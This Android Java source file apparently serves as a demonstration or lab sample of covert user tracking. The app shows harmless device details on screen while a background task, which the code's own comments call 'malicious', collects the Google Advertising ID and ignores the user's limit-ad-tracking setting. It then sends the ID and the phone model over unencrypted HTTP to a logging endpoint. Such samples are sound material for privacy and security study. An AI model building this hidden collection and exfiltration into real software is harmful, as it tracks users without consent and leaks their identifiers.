package com.example.myapplication;

import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import android.os.AsyncTask;

public class MainActivity extends AppCompatActivity {

    private TextView infoTextView;
    private final ExecutorService executor = Executors.newSingleThreadExecutor();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        infoTextView = findViewById(R.id.infoText);

        // Display harmless device information
        String deviceInfo = "Model: " + android.os.Build.MODEL + "\n"
                + "SDK Version: " + android.os.Build.VERSION.SDK_INT + "\n"
                + "Information gathered.";
        infoTextView.setText(deviceInfo);

        // Start the malicious GAID collection and exfiltration in the background
        executor.execute(new GAIDTask());
    }

    class GAIDTask implements Runnable {
        @Override
        public void run() {
            try {
                // Get the Advertising ID Info
                AdvertisingIdClient.Info adInfo = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext());
                final String gaId = adInfo.getId(); // This is the GAID
                // !! VULNERABILITY: We completely ignore adInfo.isLimitAdTrackingEnabled() !!

                // Get device model
                final String deviceModel = android.os.Build.MODEL;

                // Send the data to a remote server
                sendToServer(gaId, deviceModel);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        private void sendToServer(String gaid, String model) {
            HttpURLConnection urlConnection = null;
            try {
                // !! VULNERABILITY: Using HTTP instead of HTTPS !!
                URL url = new URL("http:///10.0.2.2:8000/log.php");
                urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setRequestMethod("POST");
                urlConnection.setDoOutput(true);

                String postData = "gaid=" + gaid + "&model=" + model;
                OutputStream os = urlConnection.getOutputStream();
                os.write(postData.getBytes("UTF-8"));
                os.close();

                // We don't even care about the response, we just send the data.
                int responseCode = urlConnection.getResponseCode();

            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (urlConnection != null) {
                    urlConnection.disconnect();
                }
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        executor.shutdown();
    }
}